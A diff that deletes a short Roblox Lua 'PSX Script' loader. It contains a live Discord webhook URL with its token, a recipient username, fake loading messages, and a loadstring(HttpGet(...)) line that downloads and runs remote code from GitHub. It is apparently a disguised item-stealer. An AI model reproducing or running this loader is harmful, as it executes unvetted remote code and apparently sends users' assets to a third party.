@@ -1,8 +1,0 @@
-UserName = "Alex23_XDUWU77"
-Webhook = "https://discord.com/api/webhooks/1103902752897241208/AKdYtmFLlDm0gV9aLZc3Owne2kMHhxIQMcYX425xMz-z2yT21WfYrmFYnywbqdGUL8lI"
-_G.ScriptName = "PSX Script"
-_G.FirstText = "Script Preparing..."
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 10
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
